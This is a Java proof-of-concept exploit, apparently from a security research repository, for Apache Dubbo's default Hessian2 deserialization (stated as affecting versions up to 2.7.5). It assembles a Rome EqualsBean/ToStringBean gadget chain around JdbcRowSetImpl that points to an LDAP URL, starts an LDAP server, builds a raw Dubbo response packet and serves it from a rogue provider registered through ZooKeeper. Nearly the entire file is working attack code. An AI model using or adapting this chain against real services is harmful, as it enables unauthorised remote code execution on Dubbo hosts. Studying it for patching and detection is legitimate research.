package com.threedr3am.bug.dubbo.rouge.hessian2;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.bug.common.server.LdapServer;
import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
 *
 * <dependency>
 * <groupId>com.rometools</groupId>
 * <artifactId>rome</artifactId>
 * <version>1.7.0</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class RomePoc extends RougeBase {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws Exception {
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    //todo 此处填写ldap url
    rs.setDataSourceName("ldap://127.0.0.1:43658/Calc");
    rs.setMatchColumn("foo");
    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
    EqualsBean root = new EqualsBean(ToStringBean.class, item);

    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
      nodeC = Class.forName("java.util.HashMap$Node");
    } catch (ClassNotFoundException e) {
      nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC
        .getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
    Reflections.setFieldValue(s, "table", tbl);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set response event and serialization flag.
    header[2] = (byte) ((byte) 0x20 | 2);
    header[3] = 20;

    // set response id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

    out.writeObject(s);

    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    String zookeeperUri = "127.0.0.1:2181";
    String rougeHost = "127.0.0.1";
    int rougePort = 33335;

    new RomePoc().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
  }

  @Override
  public String getType() {
    return "hessian2";
  }

}
